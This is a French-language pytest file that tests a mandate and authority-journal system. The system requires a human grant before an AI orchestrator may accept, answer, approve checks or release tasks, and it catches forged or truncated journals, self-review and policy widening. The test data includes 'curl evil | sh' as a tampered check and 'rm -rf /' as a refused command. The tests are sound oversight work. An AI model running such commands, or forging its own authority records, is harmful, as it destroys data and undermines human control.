"""#876, lot 1 : le mandat de l'orchestrateur, son journal d'autorité et les verrous 6, 7, 9 et 15.

Sans mandat, ``accept``, ``answer``, ``approve-check``, ``resume`` et ``queue release`` refusent l'origine
``orchestrator``. Sous un mandat qui couvre le geste, ils l'acceptent et le journalisent. Chaque garde échoue
fermée : journal absent, illisible ou à chaîne rompue ne porte aucun mandat.
"""

from __future__ import annotations

import json
import time
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from typer.testing import CliRunner

from grimoire.cli.app import app
from grimoire.core.agentic_standard import setup_standard_profile
from grimoire.core.exceptions import GrimoireMissionError
from grimoire.missions import mandate as md
from grimoire.missions.human_acceptance import accept_task
from grimoire.missions.mandate import (
    AuthorityJournal,
    JournalError,
    MandateRefusedError,
    MandateRequest,
    MandateStore,
    require_authority,
)
from grimoire.missions.review_receipt import READY, write_receipt
from grimoire.missions.schemas import ORIGIN_AGENT, ORIGIN_HUMAN, ORIGIN_ORCHESTRATOR, TaskCheck, TaskState
from grimoire.missions.service import TaskService

ACC = ("la PR est fusionnée",)
STANDARD = Path("_grimoire/standard")
PROV = {"kind": "rule", "ref": "regle-test"}
runner = CliRunner()


@pytest.fixture(autouse=True)
def _home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Un journal d'autorité neuf par test : la racine de l'utilisateur est celle du test."""
    home = tmp_path / "user-home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    for var in (
        "GRIMOIRE_TASK_ID",
        "GRIMOIRE_ACTOR",
        "GRIMOIRE_SESSION_ID",
        "CLAUDE_CODE_SESSION_ID",
        md.PRINCIPAL_ENV,
        md.PROVENANCE_ENV,
    ):
        monkeypatch.delenv(var, raising=False)
    return home


@pytest.fixture
def no_tick() -> None:
    """Les tests qui l'ouvrent éprouvent l'appelant CLI (session inscrite), pas l'API en processus du tick."""


@pytest.fixture(autouse=True)
def _tick(request: pytest.FixtureRequest) -> Any:
    """Par défaut l'appelant est le code du tick (``acting_as_orchestrator``) ; ``no_tick`` l'en retire."""
    if "no_tick" in request.fixturenames:
        yield
        return
    with md.acting_as_orchestrator():
        yield


@pytest.fixture
def project(tmp_path: Path) -> Path:
    root = tmp_path / "proj"
    root.mkdir()
    return root


def _policy(root: Path, **owners: str) -> None:
    """Écrit la section ``escalation`` du projet ; sans argument, la politique ne délègue rien."""
    path = root / STANDARD / "orchestration-policy.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("escalation:\n" + "".join(f"  {k}: {v}\n" for k, v in owners.items()), encoding="utf-8")


def _grant(
    root: Path,
    gestures: tuple[str, ...] = ("accept", "answer", "approve-check", "resume", "queue-release"),
    types: tuple[str, ...] = ("implementation",),
    cap: int = 3,
    until: str = "+1d",
) -> md.Mandate:
    return MandateStore(root).grant(MandateRequest.build(gestures, types, cap, until), origin=ORIGIN_HUMAN, via="test")


def _task(root: Path, *, checks: tuple[TaskCheck, ...] = (), owner: str = "worker") -> str:
    service = TaskService(root)
    return service.add("Correctif", ACC, owner=owner, actor=owner, ready=False, checks=checks).task.id


# ── Octroi : l'humain seul, borné, jamais le mandat ni la politique ──────────────────────────────


def test_only_a_human_origin_grants(project: Path) -> None:
    request = MandateRequest.build(("accept",), ("implementation",), 2, "+1h")
    for origin in (ORIGIN_AGENT, ORIGIN_ORCHESTRATOR, "unverified"):
        with pytest.raises(MandateRefusedError, match="humain"):
            MandateStore(project).grant(request, origin=origin, via="test")
    assert MandateStore(project).state().reason == md.NO_MANDATE


@pytest.mark.parametrize("gesture", list(md.NEVER_COVERED))
def test_the_mandate_and_the_escalation_policy_are_never_coverable(project: Path, gesture: str) -> None:
    with pytest.raises(MandateRefusedError, match="jamais couvert"):
        MandateRequest.build((gesture,), ("implementation",), 1, "+1h")
    _grant(project)
    with pytest.raises(MandateRefusedError, match="jamais couvert"):
        MandateStore(project).authorize(gesture, None, PROV)


@pytest.mark.parametrize(
    ("gestures", "types", "cap", "until"),
    [
        ((), ("implementation",), 1, "+1h"),
        (("accept",), (), 1, "+1h"),
        (("accept",), ("nope",), 1, "+1h"),
        (("accept",), ("implementation",), 0, "+1h"),
        (("accept",), ("implementation",), 1, "hier"),
        (("zap",), ("test",), 1, "+1h"),
    ],
)
def test_a_malformed_request_is_refused(
    gestures: tuple[str, ...], types: tuple[str, ...], cap: int, until: str
) -> None:
    with pytest.raises(MandateRefusedError):
        MandateRequest.build(gestures, types, cap, until)


def test_request_grant_needs_an_attested_human_turn(project: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """La voie CLI réutilise l'attestation de ``autonomy grant`` : sans tour humain, un challenge reste ouvert."""
    monkeypatch.setenv("GRIMOIRE_SESSION_ID", "S1")
    store = MandateStore(project)
    request = MandateRequest.build(("accept",), ("implementation",), 2, "+1h")
    pending, attestation = store.request_grant(request)
    assert pending is None and not attestation.attested
    assert store.state().reason == md.NO_MANDATE
    from grimoire.hosts.decisions import HookInput, run_decision
    from grimoire.hosts.events import HookEvent

    time.sleep(0.02)
    run_decision(
        "grimoire.task-context",
        HookInput(
            event=HookEvent.USER_PROMPT_SUBMIT,
            project_root=project,
            prompt="ok",
            session_id="S1",
            host="host-claude-code-cli",
        ),
    )
    time.sleep(0.02)
    mandate, attestation = store.request_grant(request)
    assert mandate is not None and attestation.attested and mandate.via == "attestation"
    assert store.state().active


# ── Sans mandat rien ne change ; avec un mandat qui couvre, l'orchestrateur agit et se journalise ─


def test_without_a_mandate_orchestrator_origin_is_refused_everywhere(project: Path) -> None:
    tid = _task(project)
    task = TaskService(project).require(tid)
    for gesture in ("accept", "answer", "approve-check", "resume", "queue-release"):
        with pytest.raises(MandateRefusedError, match="aucun mandat"):
            require_authority(project, gesture, task, ORIGIN_ORCHESTRATOR, what=gesture, provenance=PROV)
    with pytest.raises(GrimoireMissionError, match="origine 'agent'"):
        require_authority(project, "accept", task, ORIGIN_AGENT, what="Acceptation refusée")
    assert require_authority(project, "accept", task, ORIGIN_HUMAN, what="x") is None  # l'humain passe, sans journal
    assert (
        not (Path.home() / ".grimoire" / "control" / md.JOURNAL_NAME).exists()
        or MandateStore(project).gestures_taken() == []
    )


def test_a_covered_gesture_is_taken_and_journaled_with_origin_orchestrator(project: Path) -> None:
    mandate = _grant(project)
    task = TaskService(project).require(_task(project))
    auth = require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="Réponse", provenance=PROV)
    assert auth is not None and auth.mandate_id == mandate.id and auth.origin == ORIGIN_ORCHESTRATOR
    [entry] = MandateStore(project).gestures_taken(task.id)
    assert entry["origin"] == ORIGIN_ORCHESTRATOR and entry["mandate_id"] == mandate.id
    assert entry["gesture"] == "answer" and entry["provenance"] == PROV


def test_a_gesture_without_provenance_is_refused(project: Path) -> None:
    _grant(project)
    task = TaskService(project).require(_task(project))
    with pytest.raises(MandateRefusedError, match="provenance"):
        require_authority(
            project, "answer", task, ORIGIN_ORCHESTRATOR, what="Réponse", provenance={"kind": "vibes", "ref": "x"}
        )


def test_service_answer_under_mandate_records_the_mandate(project: Path) -> None:
    service = TaskService(project)
    tid = service.add("Q", ACC, owner="w", actor="w", ready=True).task.id
    service.context(tid)
    service.claim(tid, "w")
    service.transition(tid, TaskState.RUNNING, "w")
    service.ask(tid, "Quelle voie ?", "w")
    with pytest.raises(GrimoireMissionError, match="aucun mandat"):
        service.answer(tid, "voie A", "orch", origin=ORIGIN_ORCHESTRATOR, provenance=PROV)
    mandate = _grant(project)
    move = service.answer(tid, "voie A", "orch", origin=ORIGIN_ORCHESTRATOR, provenance=PROV)
    assert move.task.status is TaskState.READY
    events = [e for e in service.ledger.list_events(tid) if e.event_type == "task.human_answered"]
    assert events[-1].payload["origin"] == ORIGIN_ORCHESTRATOR and events[-1].payload["mandate_id"] == mandate.id


# ── Mandat expiré, révoqué, hors plafond, hors périmètre, politique ──────────────────────────────


def test_expired_revoked_over_cap_and_uncovered_are_refused(project: Path) -> None:
    store = MandateStore(project)
    task = TaskService(project).require(_task(project))
    _grant(project, gestures=("answer",), types=("implementation",), cap=1)
    with pytest.raises(MandateRefusedError, match="ne couvre pas ce geste"):
        store.authorize("resume", task, PROV)
    with pytest.raises(MandateRefusedError, match="type"):
        store.authorize("answer", replace(task, type=_other_type()), PROV)
    # Révoqué.
    assert store.revoke(md.REVOKE_MANUAL, "fin") is not None
    with pytest.raises(MandateRefusedError) as refused:
        store.authorize("answer", task, PROV)
    assert refused.value.code == md.REVOKED
    # Expiré : le même mandat, évalué après son échéance.
    _grant(project, gestures=("answer",), until="+1h")
    later = datetime.now(UTC) + timedelta(hours=2)
    with pytest.raises(MandateRefusedError) as expired:
        store.authorize("answer", task, PROV, now=later)
    assert expired.value.code == md.EXPIRED
    assert store.state().active is False or store.state().mandate is not None


def _other_type() -> Any:
    from grimoire.missions.schemas import TaskType

    return TaskType.DOCUMENTATION


def test_the_daily_session_cap_revokes_the_mandate(project: Path) -> None:
    store = MandateStore(project)
    mandate = _grant(project, cap=2)
    store.register_session("s1", "worker", "T-1")
    store.register_session("s2", "worker", "T-2")
    with pytest.raises(MandateRefusedError, match="plafond"):
        store.register_session("s3", "worker", "T-3")
    state = store.state()
    assert state.mandate is not None and state.mandate.id == mandate.id
    assert state.reason == md.REVOKED and md.CAP_EXCEEDED in state.detail
    task = TaskService(project).require(_task(project))
    with pytest.raises(MandateRefusedError):
        store.authorize("answer", task, PROV)


def test_a_journal_with_too_many_sessions_revokes_on_read(project: Path) -> None:
    store = MandateStore(project)
    mandate = _grant(project, cap=1)
    for n in range(2):  # le journal porte plus de sessions que le plafond (écrit hors register_session)
        store.journal.append(
            {
                "type": "session",
                "mandate_id": mandate.id,
                "session_id": f"x{n}",
                "role": "worker",
                "task_id": "",
                "ts": datetime.now(UTC).isoformat(),
            }
        )
    assert store.state().reason == md.CAP_EXCEEDED
    assert store.state().reason == md.REVOKED  # constatée une fois, inscrite


def test_escalation_policy_keeps_merge_and_accept_human_by_default(project: Path) -> None:
    store = MandateStore(project)
    _grant(project, gestures=("accept", "merge", "answer"))
    task = TaskService(project).require(_task(project))
    with pytest.raises(MandateRefusedError, match="accept"):
        store.authorize("accept", task, PROV)
    with pytest.raises(MandateRefusedError, match="merge"):
        store.authorize("merge", task, PROV)
    store.authorize("answer", task, PROV)  # aucune catégorie : passe


def test_the_kit_configuration_delegates_merge_and_accept_but_not_release_secrets_paid(project: Path) -> None:
    _policy(
        project,
        release="human",
        secrets="human",
        paid="human",
        security="human",
        merge="orchestrator",
        accept="orchestrator",
    )
    store = MandateStore(project)
    _grant(project, gestures=("accept", "merge"))
    service = TaskService(project)
    plain = service.require(_task(project))
    assert store.authorize("accept", plain, PROV).gesture == "accept"
    assert store.authorize("merge", plain, PROV).gesture == "merge"
    labelled = service.add("Pub", ACC, owner="w", actor="w", extra={"labels": ["release"]}).task
    with pytest.raises(MandateRefusedError, match="release"):
        store.authorize("accept", labelled, PROV)


def test_changing_the_escalation_policy_revokes_the_mandate(project: Path) -> None:
    _policy(project, merge="human", accept="orchestrator")
    store = MandateStore(project)
    mandate = _grant(project, gestures=("accept",))
    task = TaskService(project).require(_task(project))
    store.authorize("accept", task, PROV)
    _policy(project, merge="orchestrator", accept="orchestrator")  # l'agent élargit la délégation
    with pytest.raises(MandateRefusedError) as refused:
        store.authorize("accept", task, PROV)
    assert refused.value.code == md.POLICY_CHANGED
    state = store.state()
    assert state.mandate is not None and state.mandate.id == mandate.id and state.reason == md.REVOKED


def test_an_unreadable_or_invalid_policy_delegates_nothing(project: Path) -> None:
    path = project / STANDARD / "orchestration-policy.yaml"
    path.parent.mkdir(parents=True)
    path.write_text("escalation:\n  accept: whenever\n", encoding="utf-8")
    assert md.load_escalation(project).delegated == frozenset() and md.load_escalation(project).error
    path.write_text("escalation: [\n", encoding="utf-8")
    assert md.load_escalation(project).error


# ── Verrou 7 : reçu de revue, relecteur ≠ auteur, provenance attestée ───────────────────────────


def _worker_task(project: Path) -> Any:
    tid = _task(project, owner="worker")
    return TaskService(project).require(tid)


def test_a_review_receipt_by_the_author_is_refused_under_mandate(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    task = _worker_task(project)
    store.register_session("s-w", "worker", task.id)
    store.register_session("s-r", "reviewer", task.id)
    receipt = write_receipt(project, task.id, READY, reviewer_id="worker", reviewer_session="s-r")
    with pytest.raises(MandateRefusedError) as refused:
        store.check_receipt_provenance(task, receipt)
    assert refused.value.code == "receipt_self_review"


def test_a_review_receipt_from_the_workers_session_is_refused(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    task = _worker_task(project)
    store.register_session("s-w", "worker", task.id)
    receipt = write_receipt(project, task.id, READY, reviewer_id="agent:rev", reviewer_session="s-w")
    with pytest.raises(MandateRefusedError) as refused:
        store.check_receipt_provenance(task, receipt)
    assert refused.value.code == "receipt_self_review"


def test_a_review_receipt_without_an_attested_session_is_refused(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    task = _worker_task(project)
    anonymous = write_receipt(project, task.id, READY, reviewer_id="agent:rev")
    with pytest.raises(MandateRefusedError) as refused:
        store.check_receipt_provenance(task, anonymous)
    assert refused.value.code == "receipt_unattested"
    unknown = write_receipt(project, task.id, READY, reviewer_id="agent:rev", reviewer_session="s-fake")
    with pytest.raises(MandateRefusedError) as refused:
        store.check_receipt_provenance(task, unknown)
    assert refused.value.code == "receipt_unattested"  # absente du journal d'autorité


def test_a_distinct_attested_reviewer_is_accepted(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    task = _worker_task(project)
    store.register_session("s-w", "worker", task.id)
    store.register_session("s-r", "reviewer", task.id)
    receipt = write_receipt(project, task.id, READY, reviewer_id="agent:rev", reviewer_session="s-r")
    assert store.check_receipt_provenance(task, receipt) == "s-r"


def test_accept_under_mandate_requires_the_attested_review(project: Path) -> None:
    _policy(project, accept="orchestrator")
    service = TaskService(project)
    tid = service.add("Correctif", ACC, owner="worker", actor="worker", ready=True).task.id
    service.context(tid)
    service.claim(tid, "worker")
    service.transition(tid, TaskState.RUNNING, "worker")
    (project / "preuve.md").write_text("# preuve\n", encoding="utf-8")
    trace = project / "_grimoire-output" / "decisions" / tid / "decision-trace.yaml"
    trace.parent.mkdir(parents=True, exist_ok=True)
    trace.write_text("decisions: []\n", encoding="utf-8")
    from grimoire.missions.declarative_evidence import declare_evidence

    evidence = project / "_grimoire-runtime-output" / "evidence"
    declare_evidence(service.require(tid), project, evidence, ["preuve.md"])
    service.transition(tid, TaskState.NEEDS_VERIFICATION, "worker")
    task = service.require(tid)
    _grant(project, gestures=("accept",))
    kwargs: dict[str, Any] = {"origin": ORIGIN_ORCHESTRATOR, "provenance": PROV}
    with pytest.raises(GrimoireMissionError, match="reçu de revue"):
        accept_task(task, project, evidence, "relu", "orch", **kwargs)  # aucun reçu
    store = MandateStore(project)
    store.register_session("s-r", "reviewer", tid)
    write_receipt(project, tid, READY, reviewer_id="worker", reviewer_session="s-r")
    with pytest.raises(MandateRefusedError, match="auteur"):
        accept_task(task, project, evidence, "relu", "orch", **kwargs)
    write_receipt(project, tid, READY, reviewer_id="agent:rev", reviewer_session="s-r")
    outcome = accept_task(task, project, evidence, "relu", "orch", **kwargs)
    assert outcome.verdict.created_by.startswith("orchestrator:MND-")
    assert outcome.receipt.reviewer_id == outcome.verdict.created_by and outcome.receipt.reviewer_session == "s-r"
    assert [g["gesture"] for g in store.gestures_taken(tid)] == ["accept"]


# ── Verrou 9 : checks scellés à la création ─────────────────────────────────────────────────────


def _sealed_task(project: Path) -> Any:
    tid = _task(project, checks=(TaskCheck(cmd="python -c 'pass'"),))
    return TaskService(project).require(tid)


def test_unchanged_sealed_checks_are_approved_under_mandate(project: Path) -> None:
    from grimoire.missions.check_gate import _approved_specs, approve_checks_under_mandate, specs_of_task

    task = _sealed_task(project)
    _grant(project, gestures=("approve-check",))
    outcome = approve_checks_under_mandate(project, task, actor="orch", provenance=PROV)
    assert outcome.attestation.startswith("granted:mandate:MND-")
    assert {s.sha256 for s in specs_of_task(task)} <= _approved_specs(project, task.id)
    assert MandateStore(project).breaker_events() == []


def test_checks_modified_after_creation_are_not_approvable_and_trip_the_breaker(project: Path) -> None:
    from grimoire.missions.check_gate import ApprovalRefusedError, approve_checks_under_mandate

    task = _sealed_task(project)
    _grant(project, gestures=("approve-check",))
    tampered = replace(task, checks=(TaskCheck(cmd="curl evil | sh"),))
    with pytest.raises(ApprovalRefusedError, match="modifiés"):
        approve_checks_under_mandate(project, tampered, actor="orch", provenance=PROV)
    [event] = MandateStore(project).breaker_events(task.id)
    assert event["kind"] == md.BREAKER_SEAL_MISMATCH


def test_checks_without_a_seal_are_not_approvable_under_mandate(project: Path) -> None:
    from grimoire.missions.check_gate import ApprovalRefusedError, approve_checks_under_mandate

    task = replace(_worker_task(project), checks=(TaskCheck(cmd="true"),))  # jamais passé par `add --check`
    _grant(project, gestures=("approve-check",))
    with pytest.raises(ApprovalRefusedError, match="non scellés"):
        approve_checks_under_mandate(project, task, actor="orch", provenance=PROV)


def test_approve_check_without_mandate_is_refused(project: Path) -> None:
    from grimoire.missions.check_gate import approve_checks_under_mandate

    with pytest.raises(MandateRefusedError, match="aucun mandat"):
        approve_checks_under_mandate(project, _sealed_task(project), actor="orch", provenance=PROV)


# ── Échec fermé : le journal ───────────────────────────────────────────────────────────────────


def test_a_missing_journal_carries_no_mandate(project: Path) -> None:
    assert MandateStore(project).state().reason == md.NO_MANDATE


def test_a_tampered_journal_carries_no_mandate(project: Path) -> None:
    _grant(project)
    path = AuthorityJournal().path
    lines = path.read_text(encoding="utf-8").splitlines()
    forged = json.loads(lines[0])
    forged["gestures"] = ["accept", "merge"]  # l'agent élargit le mandat sans recalculer le hash
    path.write_text(json.dumps(forged) + "\n", encoding="utf-8")
    store = MandateStore(project)
    assert store.state().reason == md.JOURNAL_UNREADABLE and not store.state().active
    task = TaskService(project).require(_task(project))
    with pytest.raises(MandateRefusedError):
        store.authorize("answer", task, PROV)
    with pytest.raises(JournalError):
        store.journal.append({"type": "revoke"})  # un journal rompu n'est jamais prolongé


def test_a_removed_middle_entry_breaks_the_chain(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    store.register_session("s1", "worker", "T")
    store.register_session("s2", "worker", "T")
    path = store.journal.path
    lines = path.read_text(encoding="utf-8").splitlines()
    path.write_text("\n".join([lines[0], *lines[2:]]) + "\n", encoding="utf-8")
    with pytest.raises(JournalError, match="chaîne"):
        store.journal.read()
    assert not store.state().active


def test_an_unreadable_or_garbled_journal_carries_no_mandate(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    store.journal.path.write_text("pas du json\n", encoding="utf-8")
    assert store.state().reason == md.JOURNAL_UNREADABLE
    store.journal.path.unlink()
    store.journal.path.mkdir()  # illisible : un dossier à la place du fichier
    assert store.state().reason == md.JOURNAL_UNREADABLE


def test_require_authority_refuses_when_the_guard_itself_fails(project: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    def boom(self: MandateStore, *a: Any, **k: Any) -> None:
        raise RuntimeError("disque")

    _grant(project)
    monkeypatch.setattr(MandateStore, "authorize", boom)
    task = TaskService(project).require(_task(project))
    with pytest.raises(MandateRefusedError) as refused:
        require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="Réponse", provenance=PROV)
    assert refused.value.code == "guard_error"


def test_a_registered_orchestrator_session_binds_the_principal(
    project: Path, monkeypatch: pytest.MonkeyPatch, no_tick: None
) -> None:
    store = MandateStore(project)
    _grant(project)
    store.register_session("orch-1", "orchestrator")
    task = TaskService(project).require(_task(project))
    monkeypatch.setenv("GRIMOIRE_SESSION_ID", "worker-session")
    with pytest.raises(MandateRefusedError) as refused:
        require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="Réponse", provenance=PROV)
    assert refused.value.code == "principal_unattested"
    monkeypatch.setenv("GRIMOIRE_SESSION_ID", "orch-1")
    assert require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="Réponse", provenance=PROV) is not None


# ── Révocation sur événement ────────────────────────────────────────────────────────────────────


def test_events_revoke_and_the_breaker_is_exposed(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    assert store.revoke_on_forged_verdict("T-1", "verdict sans reçu") is not None
    assert [e["kind"] for e in store.breaker_events("T-1")] == [md.BREAKER_FORGED_VERDICT]
    _grant(project)
    assert store.revoke_on_write_outside_worktree("T-2", "écriture dans ../autre") is not None
    assert store.breaker_events("T-2")[0]["kind"] == md.BREAKER_WRITE_OUTSIDE_WORKTREE
    assert store.revoke() is None  # plus rien d'actif


def test_revoke_every_mandate_covers_all_projects(project: Path, tmp_path: Path) -> None:
    other = tmp_path / "other"
    other.mkdir()
    a, b = _grant(project), _grant(other)
    assert sorted(md.revoke_every_mandate(md.REVOKE_PROTECTED_WRITE, "test")) == sorted([a.id, b.id])
    assert not MandateStore(project).state().active and not MandateStore(other).state().active


# ── Gestes de la CLI sous le principal orchestrator ─────────────────────────────────────────────


@pytest.fixture
def governed(project: Path) -> Path:
    setup_standard_profile(project, profile_id="governed", task_id="bootstrap")
    return project


def _orchestrator(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv(md.PRINCIPAL_ENV, "orchestrator")
    monkeypatch.setenv(md.PROVENANCE_ENV, "rule:regle-test")


def _enroll(root: Path, monkeypatch: pytest.MonkeyPatch, session: str = "orch-session") -> None:
    """Le lanceur inscrit la session d'orchestrateur ; le processus CLI la porte."""
    md.register_orchestrator_session(root, session)
    monkeypatch.setenv("GRIMOIRE_SESSION_ID", session)


def test_cli_resume_and_queue_release_follow_the_mandate(
    governed: Path, monkeypatch: pytest.MonkeyPatch, no_tick: None
) -> None:
    _orchestrator(monkeypatch)
    root = str(governed)
    task = _task(governed)
    resume = ["orchestrate", "resume", "--project-root", root]
    release = ["queue", "release", task, "--project-root", root, "--reason", "ci finie"]
    for argv in (resume, release):
        refused = runner.invoke(app, argv)
        assert refused.exit_code == 1, refused.output  # sans mandat : refus
    _grant(governed, gestures=("resume", "queue-release"))
    _enroll(governed, monkeypatch)
    for argv in (resume, release):
        done = runner.invoke(app, argv)
        assert "geste d'humain" not in done.output, done.output
    assert {g["gesture"] for g in MandateStore(governed).gestures_taken()} == {"resume", "queue-release"}


def test_cli_approve_check_under_mandate_refuses_a_free_command(
    governed: Path, monkeypatch: pytest.MonkeyPatch, no_tick: None
) -> None:
    _orchestrator(monkeypatch)
    task = _sealed_task(governed)
    _grant(governed, gestures=("approve-check",))
    _enroll(governed, monkeypatch)
    free = runner.invoke(app, ["task", "approve-check", task.id, "--project-root", str(governed), "--cmd", "rm -rf /"])
    assert free.exit_code == 2 and "--cmd" in free.output
    ok = runner.invoke(app, ["task", "approve-check", task.id, "--project-root", str(governed)])
    assert ok.exit_code == 0, ok.output


def test_cli_mandate_grant_awaits_a_human_turn(project: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GRIMOIRE_SESSION_ID", "S1")
    result = runner.invoke(
        app,
        [
            "autonomy",
            "mandate",
            "grant",
            "--gesture",
            "accept",
            "--task-type",
            "implementation",
            "--max-sessions-per-day",
            "2",
            "--until",
            "+1h",
            "--project-root",
            str(project),
        ],
    )
    assert result.exit_code == 3, result.output
    refused = runner.invoke(
        app,
        [
            "autonomy",
            "mandate",
            "grant",
            "--gesture",
            "modify-mandate",
            "--task-type",
            "test",
            "--max-sessions-per-day",
            "1",
            "--until",
            "+1h",
            "--project-root",
            str(project),
        ],
    )
    assert refused.exit_code == 1
    status = runner.invoke(app, ["autonomy", "mandate", "status", "--project-root", str(project)])
    assert status.exit_code == 0 and "aucun mandat" in status.output


# ── Cockpit : octroi (jeton + clé), révocation, lecture ─────────────────────────────────────────


def test_cockpit_grant_needs_the_control_key(project: Path) -> None:
    from grimoire.tools.workspace_routes import workspace_get, workspace_post

    body = {"gestures": ["accept"], "task_types": ["implementation"], "max_sessions_per_day": 2, "until": "+1h"}
    path = "/api/workspace/autonomy/mandate/grant"
    for key in (None, "", "faux"):
        with pytest.raises(PermissionError):
            workspace_post(project, path, {**body, "control_key": key})
    assert MandateStore(project).state().reason == md.NO_MANDATE
    state = workspace_get(project, "/api/workspace/autonomy/mandate", {})
    assert state["active"] is False and md.control_key_path().is_file()
    with pytest.raises(PermissionError):  # clé présente mais fausse
        workspace_post(project, path, {**body, "control_key": "faux"})
    key = md.control_key_path().read_text(encoding="utf-8").strip()
    granted = workspace_post(project, path, {**body, "control_key": key})
    assert granted["granted"] is True and granted["mandate"]["via"] == "cockpit"
    assert workspace_get(project, "/api/workspace/autonomy/mandate", {})["active"] is True
    with pytest.raises(ValueError, match="jamais couvert"):
        workspace_post(project, path, {**body, "gestures": ["modify-escalation-policy"], "control_key": key})
    revoked = workspace_post(project, "/api/workspace/autonomy/mandate/revoke", {"reason": "stop"})
    assert revoked["revoked"]["id"] == granted["mandate"]["id"]
    assert workspace_get(project, "/api/workspace/autonomy/mandate", {})["active"] is False


def test_the_control_key_is_private_and_a_missing_key_never_verifies(project: Path) -> None:
    assert md.verify_control_key("x") is False  # aucune clé : échec fermé
    path = md.ensure_control_key()
    assert md.ensure_control_key() == path
    assert (path.stat().st_mode & 0o077) == 0 or path.stat().st_mode == 0  # 0600 hors Windows
    assert md.verify_control_key(path.read_text(encoding="utf-8").strip()) is True
    assert md.verify_control_key("") is False and md.verify_control_key(None) is False


# ── Le principal ne se déclare pas par l'environnement (#876, verrou 6) ─────────────────────────


def _release_argv(root: Path, task: str) -> list[str]:
    return ["queue", "release", task, "--project-root", str(root), "--reason", "ci finie"]


def test_the_env_variable_alone_never_makes_the_orchestrator(
    governed: Path, monkeypatch: pytest.MonkeyPatch, no_tick: None
) -> None:
    """Un worker qui pose GRIMOIRE_PRINCIPAL sous un mandat actif ne s'auto-valide pas."""
    _orchestrator(monkeypatch)
    task = _task(governed)
    _grant(governed, gestures=("resume", "queue-release", "answer", "accept", "approve-check"))
    for session in ("", "worker-x"):  # sans session identifiée, puis sous une session quelconque
        if session:
            monkeypatch.setenv("GRIMOIRE_SESSION_ID", session)
        refused = runner.invoke(app, _release_argv(governed, task))
        assert refused.exit_code == 1 and "attesté" in refused.output, refused.output
        refused = runner.invoke(app, ["orchestrate", "resume", "--project-root", str(governed)])
        assert refused.exit_code == 1 and "attesté" in refused.output, refused.output
    assert MandateStore(governed).gestures_taken() == []
    with pytest.raises(MandateRefusedError) as unattested:
        require_authority(
            governed, "answer", TaskService(governed).require(task), ORIGIN_ORCHESTRATOR, what="x", provenance=PROV
        )
    assert unattested.value.code == "principal_unattested"


def test_a_worker_or_reviewer_session_is_never_the_orchestrator(
    project: Path, monkeypatch: pytest.MonkeyPatch, no_tick: None
) -> None:
    store = MandateStore(project)
    _grant(project)
    task = _worker_task(project)
    store.register_session("s-w", "worker", task.id)
    store.register_session("s-r", "reviewer", task.id)
    for session in ("s-w", "s-r"):
        with pytest.raises(MandateRefusedError) as clash:
            md.register_orchestrator_session(project, session)
        assert clash.value.code == "principal_unattested"
    md.register_orchestrator_session(project, "s-o")
    with pytest.raises(MandateRefusedError) as clash:
        store.register_session("s-o", "worker", task.id)  # l'inverse aussi
    assert clash.value.code == "role_conflict"
    # La session qui tient la tâche (claim) ne valide pas, même inscrite orchestrateur avant de la prendre.
    held = replace(task, claim=replace(_claim(), session_id="s-o"))
    monkeypatch.setenv("GRIMOIRE_SESSION_ID", "s-o")
    with pytest.raises(MandateRefusedError, match="worker ou d'un relecteur"):
        require_authority(project, "answer", held, ORIGIN_ORCHESTRATOR, what="x", provenance=PROV)
    assert require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="x", provenance=PROV) is not None


def _claim() -> Any:
    from grimoire.missions.schemas import TaskClaim

    return TaskClaim(actor_id="w", host_id="h")


def test_orchestrator_session_registration_needs_an_active_mandate(project: Path, no_tick: None) -> None:
    with pytest.raises(MandateRefusedError, match="aucun mandat"):
        md.register_orchestrator_session(project, "s-o")
    _grant(project)
    for bad in ("", "  "):
        with pytest.raises(MandateRefusedError):
            md.register_orchestrator_session(project, bad)


def test_the_tick_uses_the_in_process_api_never_the_environment(
    project: Path, monkeypatch: pytest.MonkeyPatch, no_tick: None
) -> None:
    _grant(project)
    task = TaskService(project).require(_task(project))
    monkeypatch.setenv(md.PRINCIPAL_ENV, "orchestrator")  # sans effet
    with pytest.raises(MandateRefusedError, match="attesté"):
        require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="x", provenance=PROV)
    with md.acting_as_orchestrator():
        assert require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="x", provenance=PROV) is not None
    with pytest.raises(MandateRefusedError, match="attesté"):  # la portée s'arrête avec le bloc
        require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="x", provenance=PROV)


# ── Troncature de la queue du journal : retirer la dernière révocation ne rouvre pas le mandat ───


def _cut_last_line(store: MandateStore) -> None:
    lines = store.journal.path.read_text(encoding="utf-8").splitlines()
    store.journal.path.write_text("\n".join(lines[:-1]) + "\n", encoding="utf-8")


def test_removing_the_last_revocation_does_not_reopen_the_mandate(project: Path) -> None:
    store = MandateStore(project)
    mandate = _grant(project)
    assert store.revoke(md.REVOKE_MANUAL, "fin") is not None
    _cut_last_line(store)  # la chaîne de hash seule ne voit rien : le préfixe reste valide
    state = store.state()
    assert not state.active and state.reason == md.JOURNAL_UNREADABLE and "tronqu" in state.detail
    task = TaskService(project).require(_task(project))
    with pytest.raises(MandateRefusedError):
        store.authorize("answer", task, PROV)
    assert mandate.id  # le mandat n'est pas redevenu actif


def test_a_truncation_with_a_forged_head_is_still_caught_by_the_revocation_marker(project: Path) -> None:
